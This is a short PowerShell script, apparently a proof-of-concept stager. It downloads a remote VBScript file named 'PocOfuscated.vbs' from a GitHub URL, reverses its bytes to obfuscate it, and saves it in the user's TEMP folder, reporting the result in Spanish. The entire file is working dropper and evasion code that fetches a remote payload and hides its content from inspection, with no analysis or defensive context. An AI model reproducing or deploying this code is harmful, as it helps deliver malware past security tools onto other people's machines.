$url = "https://raw.githubusercontent.com/Jabato96/POCAHK/main/PocOfuscated.vbs"
$destinationPath = "$env:TEMP\downloadedFile.tmp"


$webClient = New-Object System.Net.WebClient


$fileBytes = $webClient.DownloadData($url)


$ofuscatedBytes = [System.Linq.Enumerable]::Reverse($fileBytes)


[System.IO.File]::WriteAllBytes($destinationPath, $ofuscatedBytes)

Write-Host "Archivo descargado y ofuscado guardado en $destinationPath"
